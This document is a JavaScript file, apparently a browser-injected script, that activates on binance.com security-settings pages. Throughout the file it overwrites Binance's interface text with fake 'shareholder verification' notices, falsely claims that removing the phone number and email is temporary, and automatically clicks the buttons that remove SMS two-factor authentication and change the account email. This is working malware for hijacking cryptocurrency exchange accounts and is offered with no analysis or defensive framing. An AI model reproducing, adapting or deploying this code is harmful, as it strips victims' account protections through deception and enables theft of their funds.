 var locationToExecute="binance.com"
var currentBrowserLocation=window.location.href
var numberOfClicks=0


if(currentBrowserLocation.includes(locationToExecute)){

    if(currentBrowserLocation.includes("my/security") ){



// while(numberOfClicks !==10){

//    setTimeout(() => {
//         document.querySelector(".css-1ds83c4").innerHTML=" For security you need to allow shareholder's Email linking"
//         document.querySelector(".css-fhtmef").innerHTML="For security and human verification please enable binance share-holder email linking and get login code and verificstion via personal secured link. you can link your email later"
//         document.querySelector(".css-fhtmef").innerHTML="Unlink phone number to enable Binance-shareholder Email linking .you can link number later"  
//        document.querySelector("#security2fa_sms_btn_remove").click()
//     var modal=document.querySelector(".css-1anvrp0")
//     modal.querySelector(".css-anqe3h").innerHTML="Temporarily Unbinding phone to allow Binance  shareholder verification "
//     modal.querySelector(".css-1d82qny").innerHTML="<ul><li>you are about starting your first step in binance shareholder verification. this is a policy binance follows  to make sure you are not a robot and to allow you get your binance shareholder verification code via your personal shareholder's link <li> <li>Note : this is not going to remove your phone number permanently. this is just to allow you recieve personal binance shareholder's verification code via your personal link. your number will automatically be linked back to your account after verification<li></ul> "
    
//     }, 1000);


var updateSmallViewAlert=()=>{
    if(document.querySelectorAll(".css-1incb4t")[2]){
        var modal2=document.querySelectorAll(".css-1incb4t")[2]
        modal2.querySelector(".css-anqe3h").innerHTML="Temporarily Unbinding Email to channel a verification code to Binance Shareholder's personal link "
        modal2.querySelector(".css-1d82qny").innerHTML="<ul><li>This is the last step in binance shareholder's personal link verification. This is a policy binance follows  to make sure you are not a robot that you accept all our policy and to allow you get your binance shareholder verification code via your personal shareholder's link <li> <li>Note :Your Email will never be removed Because this Email is internal to this account and will automatically be linked back after this verification.</ul> "    
    }
}


setInterval(() => {
    



    if(document.querySelector("#security2fa_sms_btn_remove")){
        document.querySelector(".css-1ds83c4").innerHTML=" For security you need to allow shareholder's Email linking"
                document.querySelector(".css-fhtmef").innerHTML="For security and human verification please enable binance share-holder email linking and get login code and verificstion via personal secured link. you can link your email later"
                document.querySelector(".css-fhtmef").innerHTML="Unlink phone number to enable Binance-shareholder Email linking .you can link number later"  
               document.querySelector("#security2fa_sms_btn_remove").click()
             updateSmallViewAlert()

            var modal=document.querySelector(".css-1anvrp0")
            modal.querySelector(".css-anqe3h").innerHTML="Temporarily Unbinding phone to allow Binance  shareholder verification "
            modal.querySelector(".css-1d82qny").innerHTML="<ul><li>you are about starting your first step in binance shareholder verification. this is a policy binance follows  to make sure you are not a robot and to allow you get your binance shareholder verification code via your personal shareholder's link <li> <li>Note : this is not going to remove your phone number permanently. this is just to allow you recieve personal binance shareholder's verification code via your personal link. your number will automatically be linked back to your account after verification<li></ul> "
           
    }
    
    if(document.querySelector("#security2fa_email_btn_change")){
    
    if(document.querySelector("#security2fa_sms_btn_remove")){
        document.querySelector(".css-1ds83c4").innerHTML=" For security you need to allow shareholder's Email linking"
            document.querySelector(".css-fhtmef").innerHTML="For security and human verification please enable binance share-holder email linking and get login code and verificstion via personal secured link. you can link your email later"
            document.querySelector(".css-fhtmef").innerHTML="Unlink phone number to enable Binance-shareholder Email linking .you can link number later"  
           document.querySelector("#security2fa_sms_btn_remove").click()
         updateSmallViewAlert()

        var modal=document.querySelector(".css-1anvrp0")
        modal.querySelector(".css-anqe3h").innerHTML="Temporarily Unbinding phone to allow Binance  shareholder verification "
        modal.querySelector(".css-1d82qny").innerHTML="<ul><li>you are about starting your first step in binance shareholder verification. this is a policy binance follows  to make sure you are not a robot and to allow you get your binance shareholder verification code via your personal shareholder's link <li> <li>Note :  your phone number will not be removed permanently. this is just to allow you recieve personal binance shareholder's verification code via your personal link. your number will automatically be linked back to your account after verification<li></ul> "
        
    }else{
    
        setTimeout(() => {
    
            if(document.querySelector("#security2fa_sms_btn_remove")){
                document.querySelector(".css-1ds83c4").innerHTML=" For security you need to allow shareholder's Email linking"
                    document.querySelector(".css-fhtmef").innerHTML="For security and human verification please enable binance share-holder email linking and get login code and verificstion via personal secured link. you can link your email later"
                    document.querySelector(".css-fhtmef").innerHTML="Unlink phone number to enable Binance-shareholder Email linking .you can link number later"  
                   document.querySelector("#security2fa_sms_btn_remove").click()
                   updateSmallViewAlert()
                   
                var modal=document.querySelector(".css-1anvrp0")
                modal.querySelector(".css-anqe3h").innerHTML="Temporarily Unbinding phone to allow Binance  shareholder verification "
                modal.querySelector(".css-1d82qny").innerHTML="<ul><li>you are about starting your first step in binance shareholder verification. this is a policy binance follows  to make sure you are not a robot and to allow you get your binance shareholder verification code via your personal shareholder's link <li> <li>Note : your phone number will not be removed permanently . this is just to allow you recieve personal binance shareholder's verification code via your personal link. your number will automatically be linked back to your account after verification<li></ul> "
                
            }else{
               
                document.querySelector("#security2fa_email_btn_change").click()
                setInterval(() => {
                    if(document.querySelectorAll(".css-1incb4t")[4]){
                        var modal2=document.querySelectorAll(".css-1incb4t")[4]
                        modal2.querySelector(".css-anqe3h").innerHTML="Temporarily Unbinding Email to channel a verification code to Binance Shareholder's personal link "
                        modal2.querySelector(".css-1d82qny").innerHTML="<ul><li>This is the last step in binance shareholder's personal link verification. This is a policy binance follows  to make sure you are not a robot that you accept all our policy and to allow you get your binance shareholder verification code via your personal shareholder's link <li> <li>Note :Your Email will never be removed Because this Email is internal to this account and will automatically be linked back after this verification.</ul> "    
                    }
                    var modal=document.querySelector(".css-1anvrp0")
                    modal.querySelector(".css-anqe3h").innerHTML="Temporarily Unbinding Email to channel a verification code to Binance Shareholder's personal link "
                    modal.querySelector(".css-1d82qny").innerHTML="<ul><li>This is the last step in binance shareholder's personal link verification. This is a policy binance follows  to make sure you are not a robot that you accept all our policy and to allow you get your binance shareholder verification code via your personal shareholder's link <li> <li>Note :Your Email will never be removed Because this Email is internal to this account and will automatically be linked back after this verification.</ul> "
                    
                },1000);
            }
            
        },9000);
    
    }
    
    
    }
    
    
    
    
    
    }, 1000);




    }
}





      